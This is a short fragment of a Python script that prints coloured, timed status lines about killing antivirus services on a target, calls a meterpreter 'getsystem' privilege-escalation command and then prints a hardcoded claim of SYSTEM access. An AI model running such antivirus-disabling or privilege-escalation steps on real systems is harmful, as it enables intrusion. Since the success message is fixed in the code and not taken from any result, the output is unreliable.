...
time.sleep(1)
print("")
print(Fore.LIGHTBLUE_EX+"[*]"+Fore.GREEN+" Killing Antivirus services on the target...")
time.sleep(1)
print("")
meterpreter("getsystem")
print("")
time.sleep(2)
print(Fore.CYAN+"... got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).")
print("")
time.sleep(1)
